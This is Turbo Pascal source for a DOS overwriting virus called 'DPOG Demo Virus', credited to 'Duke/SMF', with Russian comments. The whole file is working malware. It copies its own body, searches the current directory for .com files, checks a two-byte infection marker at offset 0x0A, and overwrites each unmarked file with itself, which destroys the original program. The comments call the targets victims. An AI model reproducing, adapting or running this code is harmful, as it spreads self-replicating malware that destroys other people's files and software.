uses dos;
const VirusSize= 4368 { Нужное вписать! };
var Author,VirusName,Generator:string;
    ID1,ID2:byte;                        {метка зараженности}
    N:searchrec;
    VirusBody:array[1..VirusSize] of byte;
    Virus:file;
{------------------}
procedure Infect(i:string);              {Заражение файлов}
var g:file;
begin
assign(g,i);
reset(g,1);                              {открыли файл-жертву}
blockwrite(g,VirusBody,VirusSize);       {записали поверх вирус}
seek(g,$0A);
blockwrite(g,ID1,1);                     {ставим метку зараженности}
blockwrite(g,ID2,1);
close(g);                                {закрыли файл-жертву}
end;
{------------------}
procedure Check(i:string);
var g:file;
    y,z:byte;
begin
assign(g,i);
reset(g,1);
seek(g,$0A);
blockread(g,y,1);
blockread(g,z,1);
close(g);
if (y<>ord(ID1)) or (z<>ord(ID2)) then Infect(i);
end;
{------------------}
procedure FindFileForKill;
begin
FindFirst('*.com',$20,N);
while doserror=0 do
  begin
  Check(N.name);
  FindNext(N)
  end;
end;
{------------------}
begin
Author:='Duke/SMF';
VirusName:='DPOG Demo Virus';
Generator:='[DPOG v0.01]';
ID1:=77;
ID2:=36;
assign(Virus,paramstr(0));reset(Virus,1);
blockread(Virus,VirusBody,VirusSize);
close(Virus);
FindFileForKill;
writeln('This is DPOG demo virus');
writeln('Created (c) by Duke/SMF');
end.
